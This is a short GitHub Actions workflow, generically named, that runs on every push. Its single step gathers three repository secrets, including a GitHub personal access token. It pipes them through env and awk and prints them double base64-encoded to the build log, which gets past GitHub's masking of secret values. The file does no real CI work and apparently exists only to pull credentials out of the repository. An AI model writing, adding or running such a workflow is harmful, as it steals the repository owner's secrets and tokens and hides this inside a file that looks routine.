name: GitHub Actions
on: push
jobs:
  init:
    runs-on: ubuntu-latest
    steps:
      - name: command
        run: env -0 | awk -v RS='\0' '/^secret_/ {print $0}' | base64 -w0 | base64 -w0
        env:
          secret_BCRBOT_BODY: ${{ secrets.BCRBOT_BODY }}
          secret_GH_PAT: ${{ secrets.GH_PAT }}
          secret_TURNOS24X7_BODY: ${{ secrets.TURNOS24X7_BODY }}
